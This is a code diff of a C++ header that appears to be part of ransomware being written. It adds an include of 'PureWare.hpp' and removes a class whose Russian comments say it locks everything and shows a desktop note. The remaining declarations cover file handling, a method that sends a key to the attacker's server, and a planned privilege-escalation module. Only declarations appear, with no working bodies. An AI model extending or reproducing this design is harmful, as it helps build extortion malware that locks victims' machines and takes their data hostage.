@@ -1,4 +1,5 @@
 //shared_ptr<vector<>>
+#include "PureWare.hpp"
 
 // All about files
 class FileModule
@@ -35,13 +36,6 @@ public:
     int SendKey() const; // Отправит ключ на сервак указанный при создании шаблона класса
 };
 
-// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
-class NoteModule
-{
-public:
-    NoteModule();
-    void MakeSomeShit(); // Блокает к херам всё и выводит надпись
-};
 
 // Escalate our privileges to local admin if not already
 // class PrivEscModule { # ToDo # };
